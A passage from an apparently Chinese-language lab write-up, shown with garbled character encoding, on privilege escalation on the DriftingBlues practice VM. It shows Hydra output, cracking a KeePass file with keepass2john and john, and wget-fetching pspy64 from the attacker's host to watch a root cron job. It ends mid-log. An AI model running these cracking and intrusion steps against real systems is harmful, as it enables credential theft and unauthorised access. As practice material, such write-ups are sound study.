class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> valid password found</span><br><span class="line">Hydra (https:<span class="comment">//github.com/vanhauser-thc/thc-hydra) finished at 2025-04-06 18:46:01</span></span><br></pre></td></tr></table></figure></div>

<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>è¿˜æ˜¯ä¸Šæ¥å…ˆçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰sudoæˆ–è€…suid  ç»“æœéƒ½æ²¡æœ‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">gill@driftingblues:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x<span class="number"> 4 </span>gill gill<span class="number"> 4096 </span>Apr <span class="number"> 6 </span>05:45 .</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 24 </span><span class="number"> 2021 </span>..</span><br><span class="line">drwx------<span class="number"> 3 </span>gill gill<span class="number"> 4096 </span>Apr <span class="number"> 6 </span>05:45 .gnupg</span><br><span class="line">-rwx------<span class="number"> 1 </span>gill gill<span class="number"> 2030 </span>Feb<span class="number"> 24 </span><span class="number"> 2021 </span>keyfile.kdbx</span><br><span class="line">drwx------<span class="number"> 2 </span>gill gill<span class="number"> 4096 </span>Feb<span class="number"> 24 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">-r-x------<span class="number"> 1 </span>gill gill  <span class="number"> 32 </span>Feb<span class="number"> 24 </span><span class="number"> 2021 </span>user.txt</span><br></pre></td></tr></table></figure></div>
<p>æœ‰æ„æ€çš„æ˜¯è¿™ä¸ª.kdbxæ–‡ä»¶ï¼Œé—®ä¸€ä¸‹aiï¼Œæ˜¯ä¸€ä¸ª KeePass 2.x ç‰ˆæœ¬çš„å¯†ç æ•°æ®åº“æ–‡ä»¶ï¼Œæ‰©å±•åä¸º .kdbxã€‚<br>KeePass æ˜¯ä¸€æ¬¾å¼€æºçš„å¯†ç ç®¡ç†å™¨ï¼Œç”¨æ¥å®‰å…¨åœ°ä¿å­˜å„ç§è´¦å·å¯†ç ã€‚å®ƒä½¿ç”¨**åŠ å¯†ç®—æ³•ï¼ˆå¦‚ AESï¼‰**æ¥ä¿æŠ¤ç”¨æˆ·çš„æ•°æ®ã€‚<br>è¿™ä¸ªç±»å‹çš„æ–‡ä»¶å¯ä»¥ç”¨johnç ´è§£å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# keepass2john keyfile.kdbx &gt; hash</span><br><span class="line">                                                                                                                                                         </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# john hash -w=/usr/<span class="keyword">share</span>/wordlists/rockyou.txt</span><br><span class="line"><span class="keyword">Using</span> <span class="keyword">default</span> <span class="keyword">input</span> <span class="keyword">encoding</span>: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="keyword">password</span> hash (KeePass [SHA256 AES <span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">1</span> (iteration count) <span class="keyword">is</span> <span class="number">60000</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">2</span> (<span class="keyword">version</span>) <span class="keyword">is</span> <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">3</span> (algorithm [<span class="number">0</span>=AES <span class="number">1</span>=TwoFish <span class="number">2</span>=ChaCha]) <span class="keyword">is</span> <span class="number">0</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> <span class="keyword">abort</span>, almost <span class="keyword">any</span> other key <span class="keyword">for</span> status</span><br><span class="line">porsiempre       (keyfile)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">13</span> DONE (<span class="number">2025</span><span class="number">-04</span><span class="number">-06</span> <span class="number">20</span>:<span class="number">10</span>) <span class="number">0.07496</span>g/s <span class="number">518.1</span>p/s <span class="number">518.1</span>c/s <span class="number">518.1</span>C/s polly..better</span><br><span class="line">Use the &quot;--show&quot; <span class="keyword">option</span> <span class="keyword">to</span> display <span class="keyword">all</span> <span class="keyword">of</span> the cracked passwords reliably</span><br><span class="line"><span class="keyword">Session</span> completed. </span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°å¯†ç åï¼Œå®‰è£…ä¸€ä¸ªæŸ¥çœ‹keepassçš„å·¥å…·</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># apt install keepassxc</span></span><br></pre></td></tr></table></figure>
<p>è¾“å…¥å¯†ç ä¹‹åå¾—åˆ°ä¸€äº›æ ‡é¢˜<br><img src="https://pic1.imgdb.cn/item/67f26ffb0ba3d5a1d7eed586.png"><br>ç„¶åè¿™äº›ä¹Ÿä¸æ˜¯rootçš„å¯†ç  ï¼Œåé¢çš„éƒ¨åˆ†å°±å¾ˆå¥‡æ€ªï¼Œä¸æ˜¯æ­£å¸¸æ€è·¯å¯ä»¥æƒ³åˆ°çš„<br>å…ˆä»æœ¬åœ°æ‹¿ä¸€ä¸ªpspy64çœ‹ä¸€ä¸‹å®šæ—¶ä»»åŠ¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">â””â”€# python3 -m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> port <span class="number">80</span> (http://<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168.64.174</span> - - <span class="string">[06/Apr/2025 20:15:24]</span> <span class="string">&quot;<span class="keyword">GET</span> /pspy64 HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">gill@driftingblues:~$ wget <span class="number">192</span>.<span class="number">168</span>.<span class="number">64</span>.<span class="number">11</span>/pspy64</span><br><span class="line">--<span class="number">2025</span>-<span class="number">04</span>-<span class="number">06</span> <span class="number">07</span>:<span class="number">15</span>:<span class="number">22</span>--  http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">64</span>.<span class="number">11</span>/pspy64</span><br><span class="line">Connecting to <span class="number">192</span>.<span class="number">168</span>.<span class="number">64</span>.<span class="number">11</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">3104768</span> (<span class="number">3</span>.0M) <span class="string">[application/octet-stream]</span></span><br><span class="line">Saving to: â€˜pspy64â€™</span><br><span class="line"></span><br><span class="line">pspy64                                 <span class="number">100</span>%<span class="string">[=========================================================================&gt;]</span>   <span class="number">2</span>.96M  <span class="number">1</span>.01MB/s    in <span class="number">2</span>.9s    </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">04</span>-<span class="number">06</span> <span class="number">07</span>:<span class="number">15</span>:<span class="number">27</span> (<span class="number">1</span>.<span class="number">01</span> MB/s) - â€˜pspy64â€™ saved <span class="string">[3104768/3104768]</span></span><br><span class="line"></span><br><span class="line">gill@driftingblues:~$ chmod +x pspy64</span><br></pre></td></tr></table></figure></div>
<p>è¿è¡Œä¹‹åï¼Œå‘ç°æœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">2025</span>/<span class="number">04</span>/<span class="number">06</span> <span class="number">07</span>:<span class="number">16</span>:<span class="number">20</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1</span>      | /sbin/init </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">04</span>/<span class="number">06</span> <span class="number">07</span>:<span class="number">17</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">696</span>    | /usr/sbin/CRON -f </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">04</span>/<span class="number">06</span> <span class="number">07</span>:<span class="number">17</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">695</span>    | /usr/sbin/cron -f </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">04</span>/<span class="number">06</span> <span class="number">07</span>:<span class="number">17</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">697</span>    | /usr/sbin/CRON -f </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">04</span>/<span class="number">06</span> <span class="number">07</span>:<span class="number">17</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">698</span>    | /usr/sbin/CRON -f </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">04</span>/<span class="number">06</span> <span class="number">07</span>:<span class="number">17</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">699</span>    | /bin/sh -c    cd / &amp;&amp; run-parts --report /etc/cron.hourly </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">04</span>/<span class="number">06</span> <span class="number">07</span>:<span class="number">17</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">700</span>    | /bin/sh -c /root/key.sh </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">04</span>/<span class="number">06</span> <span class="number">07</span>:<span class="number">17</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">701</span>    | /bin/ /root/key.sh </span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰ä¸€ä¸ª&#x2F;root&#x2F;key.sh è¿™ç§è„šæœ¬ä¸€èˆ¬å°±æ˜¯æ£€æµ‹æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gill</span>@driftingblues:/$ ls -al</span><br><span class="line"><span class="attribute">total</span> <span class="number">69</span></span><br><span class="line"><span class="attribute">drwxr</span>-xr-x <span class="number">19</span> root root  <span class="number">4096</span> Feb <span class="number">24</span>  <span class="number">2021</span> .</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x <span class="number">19</span> root root  <span class="number">4096</span> Feb <span class="number">24</span>  <span class="number">2021</span> ..</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root     <span class="number">7</span> Dec <span class="number">17</span>  <span class="number">2020</span> bin -&gt; usr/bin</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x  <span class="number">3</span> root root  <span class="number">4096</span> Dec <span class="number">17</span>  <span class="number">2020</span> boot</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x <span class="number">17</span> root root  <span class="number">3260</span> Apr  <span class="number">6</span> <span class="number">07</span>:<span class="number">04</span> dev</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x <span class="number">73</span> root root  <span class="number">4096</span> Apr  <span class="number">6</span> <span class="number">07</span>:<span class="number">04</span> etc</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x  <span class="number">3</span> root root  <span class="number">4096</span> Feb <span class="number">24</span>  <span class="number">2021</span> home</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root    <span class="number">31</span> Dec <span class="number">17</span>  <span class="number">2020</span> initrd.img -&gt; boot/initrd.img-<span class="number">4</span>.<span class="number">19</span>.<span class="number">0</span>-<span class="number">13</span>-amd64</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root    <span class="number">31</span> Dec <span class="number">17</span>  <span class="number">2020</span> initrd.img.old -&gt; boot/initrd.img-<span class="number">4</span>.<span class="number">19</span>.<span class="number">0</span>-<span class="number">13</span>-amd64</span><br><span class="line"><span class="attribute">drwx</span>---rwx  <span class="number">2</span> root root  <span class="number">4096</span> Feb <span class="number">24</span>  <span class="number">2021</span> keyfolder</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root     <span class="number">7</span> Dec <span class="number">17</span>  <span class="number">2020</span> lib -&gt; usr/lib</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root     <span class="number">9</span> Dec <span class="number">17</span>  <span class="number">2020</span> lib32 -&gt; usr/lib32</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root     <span class="number">9</span> Dec <span class="number">17</span>  <span class="number">2020</span> lib64 -&gt; usr/lib64</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root    <span class="number">10</span> Dec <span class="number">17</span>  <span class="number">2020</span> libx32 -&gt; usr/libx32</span><br><span class="line"><span class="attribute">drwx</span>------  <span class="number">2</span> root root <span class="number">16384</span> Dec <span class="number">17</span>  <span class="number">2020</span> lost+found</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x  <span class="number">3</span> root root  <span class="number">4096</span> Dec <span class="number">17</span>  <span class="number">2020</span> media</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x  <span class="number">2</span> root root  <span class="number">4096</span> Dec <span class="number">17</span>  <span class="number">2020</span> mnt</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x  <span class="number">2</span> root root  <span class="number">4096</span> Dec <span class="number">17</span>  <span class="number">2020</span> opt</span><br><span class="line"><span class="attribute">dr</span>-xr-xr-x <span class="number">88</span> root root     <span class="number">0</span> Apr  <span class="number">6</span> <span class="number">07</span>:<span class="number">04</span> proc</span><br><span class="line"><span class="attribute">drwx</span>------  <span class="number">2</span> root root  <span class="number">4096</span> Feb <span class="number">24</span>  <span class="number">2021</span> root</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x <span class="number">18</span> root root   <span class="number">540</span> Apr  <span class="number">6</span> <span class="number">07</span>:<span class="number">14</span> run</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root     <span class="number">8</span> Dec <span class="number">17</span>  <span class="number">2020</span> sbin -&gt; usr/sbin</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x  <span class="number">2</span> root root  <span class="number">4096</span> Dec <span class="number">17</span>  <span class="number">2020</span> srv</span><br><span class="line"><span class="attribute">dr</span>-xr-xr-x <span class="number">13</span> root root     <span class="number">0</span> Apr  <span class="number">6</span> <span class="number">07</span>:<span class="number">04</span> sys</span><br><span class="line"><span class="attribute">drwxrwxrwt</span>  <span class="number">9</span> root root  <span class="number">1024</span> Apr  <span class="number">6</span> <span class="number">07</span>:<span class="number">09</span> tmp</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x <span class="number">13</span> root root  <span class="number">4096</span> Dec <span class="number">17</span>  <span class="number">2020</span> usr</span><br><span class="line"><span class="attribute">drwxr</span>-xr-x <span class="number">13</span> root root  <span class="number">4096</span> Dec <span class="number">17</span>  <span class="number">2020</span> var</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root    <span class="number">28</span> Dec <span class="number">17</span>  <span class="number">2020</span> vmlinuz -&gt; boot/vmlinuz-<span class="number">4</span>.<span class="number">19</span>.<span class="number">0</span>-<span class="number">13</span>-amd64</span><br><span class="line"><span class="attribute">lrwxrwxrwx</span>  <span class="number">1</span> root root    <span class="number">28</span> Dec <span class="number">17</span>  <span class="number">2020</span> vmlinuz.old -&gt; boot/vmlinuz-<span class="number">4</span>.<span class="number">19</span>.<span class="number">0</span>-<span class="number">13</span>-amd64</span><br></pre></td></tr></table></figure></div>
<p>åˆ°æ ¹ç›®å½•ä¸‹é¢ï¼Œå‘ç°æœ‰ä¸€ä¸ªkeyfolderç›®å½•ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯åœ¨è¿™ä¸ªç›®å½•é‡Œé¢åˆ›å»ºæ–‡ä»¶ï¼Œæ–‡ä»¶åå°±æ˜¯keepassé‡Œé¢çš„æ ‡é¢˜ï¼Œä»åå¾€å‰åˆ›å»ºï¼Œè¿™æ ·èƒ½æ›´å¿«çš„æ‰¾åˆ°<br>åˆ›å»ºæ–‡ä»¶ä¹‹ååœ¨ç”¨pspy64ï¼Œçœ‹æ‰§è¡Œæ£€æµ‹å®šæ—¶ä»»åŠ¡ä¹‹åæœ‰æ²¡æœ‰ä»€ä¹ˆå˜åŒ–<br>ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ï¼Œä¸Šæ¬¡çš„æ–‡ä»¶è¦åˆ é™¤ï¼Œå°±æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹åªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">gill@driftingblues:/keyfolder$ ls</span><br><span class="line">fracturedocean</span><br><span class="line">gill@driftingblues:/keyfolder$ /home/gill/pspy64</span><br><span class="line">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     â–ˆâ–ˆâ–“â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–“â–ˆâ–ˆâ–ˆ â–“â–ˆâ–ˆ   â–ˆâ–ˆâ–“</span><br><span class="line">    â–“â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’â–’â–ˆâ–ˆ    â–’ â–“â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’â–’â–ˆâ–ˆ  â–ˆâ–ˆâ–’</span><br><span class="line">    â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–“â–’â–‘ â–“â–ˆâ–ˆâ–„   â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–“â–’ â–’â–ˆâ–ˆ â–ˆâ–ˆâ–‘</span><br><span class="line">    â–’â–ˆâ–ˆâ–„â–ˆâ–“â–’ â–’  â–’   â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–„â–ˆâ–“â–’ â–’ â–‘ â–â–ˆâ–ˆâ–“â–‘</span><br><span class="line">    â–’â–ˆâ–ˆâ–’ â–‘  â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–ˆâ–ˆâ–’ â–‘  â–‘ â–‘ â–ˆâ–ˆâ–’â–“â–‘</span><br><span class="line">    â–’â–“â–’â–‘ â–‘  â–‘â–’ â–’â–“â–’ â–’ â–‘â–’â–“â–’â–‘ â–‘  â–‘  â–ˆâ–ˆâ–’â–’â–’ </span><br><span class="line">    â–‘â–’ â–‘     â–‘ â–‘â–’  â–‘ â–‘â–‘â–’ â–‘     â–“â–ˆâ–ˆ â–‘â–’â–‘ </span><br><span class="line">    â–‘â–‘       â–‘  â–‘  â–‘  â–‘â–‘       â–’ â–’ â–‘â–‘  </span><br><span class="line">                   â–‘           â–‘ â–‘     </span><br><span class="line">                               â–‘ â–‘     </span><br><span class="line"></span><br><span class="line">Config: Printing events (<span class="attribute">colored</span>=<span class="literal">true</span>): <span class="attribute">processes</span>=<span class="literal">true</span> | <span class="attribute">file-system-events</span>=<span class="literal">false</span> ||| Scanning <span class="keyword">for</span> processes every 100ms <span class="keyword">and</span> on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file<span class="built_in"> system </span>events due <span class="keyword">to</span> startup<span class="built_in">..</span>.</span><br><span class="line">done</span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=1000  <span class="attribute">PID</span>=783    | /home/gill/pspy64 </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=725    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=702    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=1000  <span class="attribute">PID</span>=675    | -bash </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=1000  <span class="attribute">PID</span>=674    | sshd: gill@pts/0     </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=1000  <span class="attribute">PID</span>=661    | (sd-pam) </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=1000  <span class="attribute">PID</span>=660    | /lib/systemd/systemd --user </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=657    | sshd: gill [priv]    </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=656    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=33    <span class="attribute">PID</span>=484    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=33    <span class="attribute">PID</span>=483    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=33    <span class="attribute">PID</span>=482    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=33    <span class="attribute">PID</span>=481    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=33    <span class="attribute">PID</span>=480    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=477    | /usr/sbin/apache2 -k start </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=106   <span class="attribute">PID</span>=476    | /usr/sbin/mysqld </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=417    | /usr/sbin/sshd -D </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=409    | /sbin/agetty -o -p -- \u --noclear tty1 linux </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=388    | /lib/systemd/systemd-logind </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=384    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=104   <span class="attribute">PID</span>=383    | /usr/bin/dbus-daemon --system <span class="attribute">--address</span>=systemd: --nofork --nopidfile --systemd-activation --syslog-only </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=382    | /usr/sbin/rsyslogd -n -iNONE </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=381    | /usr/sbin/cron -f </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=101   <span class="attribute">PID</span>=356    | /lib/systemd/systemd-timesyncd </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=348    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=347    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=345    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=344    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=339    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=337    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=281    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=280    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=235    | /lib/systemd/systemd-udevd </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=220    | /lib/systemd/systemd-journald </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=187    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=186    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=184    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=153    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=116    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=114    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=113    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=111    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=110    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=109    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=108    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=106    | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=59     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=50     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=49     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=48     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=30     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=29     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=28     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=27     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=26     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=25     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=24     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=23     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=22     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=21     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=20     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=19     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=18     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=17     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=16     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=15     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=14     | </span><br><span class="line">2025/04/06 07:24:20 CMD: <span class="attribute">UID</span>=0     <span class="attribute">PID</span>=13     | 